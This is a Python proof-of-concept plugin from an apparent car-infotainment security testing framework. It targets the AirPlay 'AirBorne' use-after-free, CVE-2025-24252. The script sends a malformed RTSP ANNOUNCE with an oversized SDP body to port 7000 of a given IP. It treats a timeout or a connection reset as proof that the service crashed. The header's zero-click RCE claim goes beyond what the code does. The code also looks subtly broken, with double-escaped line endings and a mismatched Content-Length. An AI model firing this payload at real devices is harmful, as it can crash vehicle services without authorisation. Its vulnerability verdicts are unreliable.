"""
PoC Name: AirPlay AirBorne UAF
CVE: CVE-2025-24252
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 9.8
Description: AirPlay协议UAF漏洞+用户交互绕过实现零点击RCE
Prerequisites: 与车机处于同一局域网并能访问 TCP 7000/5000 (AirPlay/RTSP) 端口。
Usage: python3 50_AirPlay_AirBorne_UAF.py <target_ip>
"""
import sys
import socket
from iv_plugin_base import IVIVulnerabilityPlugin

class AirBorneUAFPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        if not self.target_ip or self.target_ip == 'N/A':
            self.logger.error("未指定目标IP地址。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"探测目标 {self.target_ip} AirPlay (AirTunes) 服务是否存在 AirBorne (CVE-2025-24252) 漏洞...")
        
        target_port = 7000 # Default AirPlay RTSP port
        
        try:
            # 连接到 AirPlay 端口
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            
            try:
                sock.connect((self.target_ip, target_port))
                self.logger.info("[+] 成功与 AirPlay (TCP 7000) 建立连接。")
                
                # 构造漏洞触发载荷：畸形的 RTSP 请求
                # AirBorne UAF 中，特定格式的缺少预期字段的复杂 SDP 参数会导致内存被提前释放却依然被引用
                uaf_payload = (
                    b"ANNOUNCE rtsp://10.0.0.1/1234567890 RTSP/1.0\\r\\n"
                    b"CSeq: 1\\r\\n"
                    b"Content-Type: application/sdp\\r\\n"
                    b"Content-Length: 2048\\r\\n"
                    b"\\r\\n"
                )
                
                # 附带巨大且结构错乱的 Body 触发堆分配后再利用
                malformed_body = b"v=0\\r\\no=AirTunes 1111 2222 IN IP4 0.0.0.0\\r\\ns=AirTunes\\r\\ni=AirBorne_UAF_Test\\r\\n" + b"X" * 1800
                uaf_payload += malformed_body
                
                self.logger.info(f"开始注入 AirBorne 恶意载荷 ({len(uaf_payload)} bytes)...")
                sock.sendall(uaf_payload)
                
                response = sock.recv(1024)
                if response:
                    status_line = response.decode(errors='ignore').split('\\r\\n')[0]
                    self.logger.info(f"服务器反而返回了响应: {status_line}")
                    self.logger.info("目标系统表现正常，可能不受该漏洞影响或漏洞未被即时触发。")
                    return {
                        "status": "success",
                        "vulnerable": False,
                        "details": "Target responded normally, patch likely installed."
                    }
                    
            except socket.timeout:
                self.logger.warning("[-] 连接或读写超时 (Timeout)！")
                self.logger.warning("[!] 这通常意味着 AirPlay 服务进程 (AirPlayd) 已经处理错误负载而崩溃。漏洞存在高度嫌疑！")
                return {"status": "success", "vulnerable": True, "details": "Service crashed. Suspicions of UAF confirmed."}
            except ConnectionRefusedError:
                self.logger.info("[-] 连接被拒绝 (Connection Refused)。端口可能关闭。")
                return {"status": "success", "vulnerable": False, "details": "Port 7000 closed"}
            except ConnectionResetError:
                self.logger.warning("[!] 连接被重置 (Connection Reset)！AirPlay 进程崩溃的明显标志。")
                return {"status": "success", "vulnerable": True, "details": "Connection reset by peer immediately. AirPlay crashed."}
                
        except Exception as e:
            self.logger.error(f"执行异常: {e}")
            return {"status": "error", "details": str(e)}
        finally:
             sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 50_AirPlay_AirBorne_UAF.py <target_ip>")
        sys.exit(1)
    plugin = AirBorneUAFPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
